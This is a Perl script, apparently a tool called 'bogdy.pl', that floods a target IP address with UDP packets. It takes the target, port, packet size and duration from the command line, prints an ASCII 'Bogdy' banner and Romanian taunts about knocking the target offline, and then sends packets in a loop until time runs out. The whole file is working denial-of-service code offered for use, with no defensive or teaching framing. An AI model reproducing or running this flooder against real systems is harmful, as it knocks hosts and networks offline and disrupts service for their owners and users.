
use Socket;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "\e[0;32m comanda e perl bogdy.pl <ip> <port> <packet size> <time>\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";                                                                                                 																							  
printf "\e[0;32m BBBBBBBBBBBBBBBBB                                                 d::::::d\n";                       
printf " B::::::::::::::::B                                                d::::::d\n";                      
printf " B::::::BBBBBB:::::B                                               d::::::d\n";                      
printf " BB:::::B     B:::::B                                              d:::::d \n";                     
printf "   B::::B     B:::::B  ooooooooooo     ggggggggg   ggggg   ddddddddd:::::yyyyyyy           yyyyyyy\n";
printf "   B::::B     B:::::Boo:::::::::::oo  g:::::::::ggg::::g dd::::::::::::::dy:::::y         y:::::y\n";
printf "   B::::BBBBBB:::::Bo:::::::::::::::og:::::::::::::::::gd::::::::::::::::d y:::::y       y:::::y\n";
printf "   B:::::::::::::BB o:::::ooooo:::::g::::::ggggg::::::gd:::::::ddddd:::::d  y:::::y     y:::::y\n";
printf "   B::::BBBBBB:::::Bo::::o     o::::g:::::g     g:::::gd::::::d    d:::::d   y:::::y   y:::::y\n"; 
printf "   B::::B     B:::::o::::o     o::::g:::::g     g:::::gd:::::d     d:::::d    y:::::y y:::::y\n";   
printf "   B::::B     B:::::o::::o     o::::g:::::g     g:::::gd:::::d     d:::::d     y:::::y:::::y\n";    
printf "   B::::B     B:::::o::::o     o::::g::::::g    g:::::gd:::::d     d:::::d      y:::::::::y\n";      
printf " BB:::::BBBBBB::::::o:::::ooooo:::::g:::::::ggggg:::::gd::::::ddddd::::::dd      y:::::::y\n";       
printf " B:::::::::::::::::Bo:::::::::::::::og::::::::::::::::g d:::::::::::::::::d       y:::::y\n";        
printf " B::::::::::::::::B  oo:::::::::::oo  gg::::::::::::::g  d:::::::::ddd::::d      y:::::y\n";         
printf " BBBBBBBBBBBBBBBBB     ooooooooooo      gggggggg::::::g   ddddddddd   ddddd     y:::::y\n";         
printf "                                                g:::::g                        y:::::y\n";          
printf "                                    gggggg      g:::::g                       y:::::y\n";            
printf "                                    g:::::gg   gg:::::g                      y:::::y\n";             
printf "                                      gg:::::::::::::g                     yyyyyyy\n";               
printf "                                        ggg::::::ggg\n";                                              
printf "                                           gggggg\n";                                                
sleep 2;
printf "\n";
printf "\e[0;31mÂ»\e[0;0m Folosim toata banda...\n";
printf "\n";
sleep 5;																								  
printf "\e[0;31mÂ»\e[0;0m Il bagam in spital pe \e[0;31m$ip\e[0;0m pe portul \e[0;31m$port\e[0;0m cu \e[0;31m$size\e[0;0m pachete pentru \e[0;31m$time \e[0;0msecunde\n";
printf "\n";
sleep 3;
printf "\e[0;31mÂ»\e[0;0m I-a picat Telekomu' in cap\n";
sleep 2;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","01010101"), 0, pack_sockaddr_in($pport, $iaddr));}
